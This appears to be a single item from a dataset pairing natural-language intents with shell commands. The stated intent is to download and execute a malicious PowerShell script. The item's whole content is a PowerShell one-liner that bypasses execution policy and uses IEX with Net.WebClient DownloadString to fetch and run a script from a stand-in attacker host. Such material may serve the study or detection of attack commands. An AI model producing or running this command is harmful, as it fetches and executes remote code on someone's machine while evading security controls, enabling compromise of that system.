# Natural language intent:
# Download and execute a malicious PowerShell script from a remote server with Bypass execution policy.

powershell.exe -ep bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://evilsurl.com/threat/kern123.ps1')"
